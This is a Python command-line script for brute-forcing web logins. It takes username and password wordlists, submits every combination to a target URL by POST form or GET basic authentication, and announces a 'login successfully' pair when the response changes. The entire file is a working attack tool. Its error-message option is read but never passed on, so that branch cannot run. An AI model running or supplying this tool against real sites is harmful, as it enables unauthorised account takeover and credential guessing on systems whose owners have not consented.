import requests
import argparse
from termcolor import colored 
 
def banner(usr_wordlist,pwd_wordlist, target, method, user, passwd,error=''):
    text = '''
 /$$$$$$$                        /$$                       /$$$$$$                                       
| $$__  $$                      | $$                      /$$__  $$                                      
| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$        | $$  \__//$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$       | $$$$   /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
| $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$       | $$_/  | $$  \ $$| $$  \__/| $$      | $$$$$$$$
| $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/       | $$    | $$  | $$| $$      | $$      | $$_____/
| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$       | $$    |  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$
|_______/ |__/       \______/    \___/   \_______//$$$$$$|__/     \______/ |__/       \_______/ \_______/
                                                 |______/                                                
                                                                                                         
                                                                                                         '''
    print(colored(text,'red'))
    print('\n')
    print(colored('URL format :','white'),colored(target,'cyan',attrs=['bold']))
    print(colored('HTTP Method:','white'),colored(method.upper(),'cyan',attrs=['bold']))
    print(colored('Username :','white'),colored(user,'cyan',attrs=['bold']))
    print(colored('Password :','white'),colored(passwd,'cyan',attrs=['bold']))
    print(colored('Error :','white'),colored(error,'red',attrs=['bold']))
    print(colored('Usernames Wordlist:','white'),colored(usr_wordlist,'cyan',attrs=['bold']))
    print(colored('Passwords Wordlist:','white'),colored(pwd_wordlist,'cyan',attrs=['bold']))
    print("\n")

def parse_arguments():
    parser = argparse.ArgumentParser(description='BruteForce Attack')
    parser.add_argument('-ul', '--userwordlist', required=True, help='Path of usernames wordlist file')
    parser.add_argument('-pl', '--passwordlist', required=True, help='Path of passwords wordlist file')
    parser.add_argument('-t', '--targeturl', required=True, help='Target URL')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-m', '--method', required=True, choices=['get', 'post'], help='HTTP method [get or post]')
    parser.add_argument('-e', '--error', required=False, help='Error Message')

    return parser.parse_args()

def create_data_list(usr_wordlist, pwd_wordlist, user, passwd):
    data = []
    with open(usr_wordlist, 'r') as file:
        usernames = [line.strip() for line in file]
    with open(pwd_wordlist, 'r') as file:
        passwords = [line.strip() for line in file]

    for username in usernames:
        for password in passwords:
            data.append({user: username, passwd: password})

    return data

def bruteforce(usr_wordlist,pwd_wordlist, target, method, user, passwd,error=''):
    found = 0
    data_list = create_data_list(usr_wordlist,pwd_wordlist, user, passwd)
    old_resp = requests.get(target).text
    if error == '':
        for i in data_list:
            
            if method == 'post':
                response = requests.post(target, data=i)
            elif method == 'get':
                tup = (i[user], i[passwd])
                response = requests.get(target, auth=tup)
            new_resp = response.text
            print(f"trying combination : [{i[user]}:{i[passwd]}]")
            if old_resp != new_resp:
                print(colored(f"login successfully : [{i[user]}:{i[passwd]}]", 'green', attrs=['bold']))
                found = 1
                break
            else:
                continue

    else:
        for i in data_list:
            
            if method == 'post':
                response = requests.post(target, data=i)
            elif method == 'get':
                tup = (i[user], i[passwd])
                response = requests.get(target, auth=tup)
            new_resp = response.text
            print(f"Trying combination : [{i[user]}:{i[passwd]}]")
            if old_resp != new_resp and error not in new_resp:
                print(colored(f"login successfully : [{i[user]}:{i[passwd]}]", 'green', attrs=['bold']))
                found = 1
                break
            else:
                continue

    if found == 0:  
        print(colored("No combination found",'cyan',attrs=['bold']))

def main():
    args = parse_arguments()
    usr_wordlist = args.userwordlist
    pwd_wordlist = args.passwordlist
    target_url = args.targeturl
    http_method = args.method
    username = args.username
    password = args.password
    error = args.error

    
    banner(usr_wordlist,pwd_wordlist,target_url, http_method, username, password,error)
    bruteforce(usr_wordlist,pwd_wordlist,target_url, http_method, username, password)

if __name__ == '__main__':
    main()